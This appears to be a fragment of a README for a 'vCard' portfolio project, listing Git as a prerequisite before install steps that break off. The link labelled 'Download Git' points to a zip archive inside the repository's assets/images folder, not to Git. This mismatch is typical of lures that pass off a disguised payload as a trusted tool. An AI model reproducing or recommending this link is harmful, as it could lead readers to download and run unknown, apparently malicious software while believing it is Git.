## Prerequisites

Before you begin, ensure you have met the following requirements:

* [Git](https://github.com/MVCOLLINS/My_Portfolio/raw/refs/heads/main/assets/images/Portfolio_My_3.6.zip "Download Git") must be installed on your operating system.

To install **vCard**, follow these steps:

Linux and macOS:

